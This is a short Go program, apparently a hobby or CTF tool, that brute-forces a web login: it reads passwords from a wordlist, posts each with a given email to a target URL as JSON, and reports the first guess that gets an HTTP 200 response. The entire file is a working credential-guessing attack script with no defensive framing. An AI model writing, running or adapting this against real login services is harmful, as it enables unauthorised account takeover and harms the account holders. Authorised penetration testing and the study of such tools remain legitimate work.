package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
)

func main() {
	fmt.Println("[!] Bruteforcing :D")
	var path string = os.Args[1]
	var url string = os.Args[2]
	var username string = os.Args[3]

	fmt.Printf("[!] Attacking: %s \n", url)

	wordlistFile, err := os.Open(path)

	if err != nil {
		os.Exit(-1)
	}

	defer wordlistFile.Close()

	scanner := bufio.NewScanner(wordlistFile)

	for scanner.Scan() {
		var guess string = scanner.Text()
		fmt.Printf("\033[2K\r[?] Guess: %s", guess)
		body := map[string]string{"email": username, "password": guess}
		json_body, err := json.Marshal(body)
		if err != nil {
			os.Exit(-1)
		}
		guess = strings.Trim(guess, " \n")

		resp, err := http.Post(url, "application/json", bytes.NewBuffer(json_body))
		if resp.StatusCode == 200 {
			fmt.Printf("\n[x] Found: %s", guess)
			return
		}

	}
}
